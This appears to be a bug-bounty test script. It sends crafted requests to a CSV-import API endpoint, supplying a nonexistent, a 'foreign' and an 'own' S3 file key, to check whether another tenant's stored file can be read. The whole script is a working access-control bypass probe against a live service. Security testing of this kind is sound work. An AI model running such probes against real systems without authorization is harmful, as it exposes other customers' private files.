import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(path,body):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
FOREIGN="demo-certs-dkim_demo/v1test/20/a21d2af0-ab9e-4d1e-b85b-552adc6caf1a/Sample 6 - 10.pdf"
OWN="bugbounty1120509_qa/Attachment/11198/a3661eb1-3877-4a29-8b5c-e8f6160e22c1/zx-D-dnsfail.pdf"
ab={"fieldName":"id","label":"ID","type":"string","canonicalReference":"id","isCustomField":False}
ext={"fieldName":"id","label":"ID","type":"string","canonicalReference":"id","fieldType":"string","displayName":"ID"}
base={"findingIdColumn":"id",
      "assetMatchMappings":[{"auditboard_field":ab,"external_field":ext,"sync_direction":"ab_to_external"}],
      "fieldMappings":[]}
for label,key in [("NONEXIST","nope/nope/nope.csv"),("FOREIGN",FOREIGN),("OWN",OWN)]:
    body=dict(base,s3Key=key)
    c,b=req('/api/v1/vms/csv-import',body)
    print(f"=== {label}: {c}")
    print("   ",b[:700].replace(chr(10),' '))
    print()
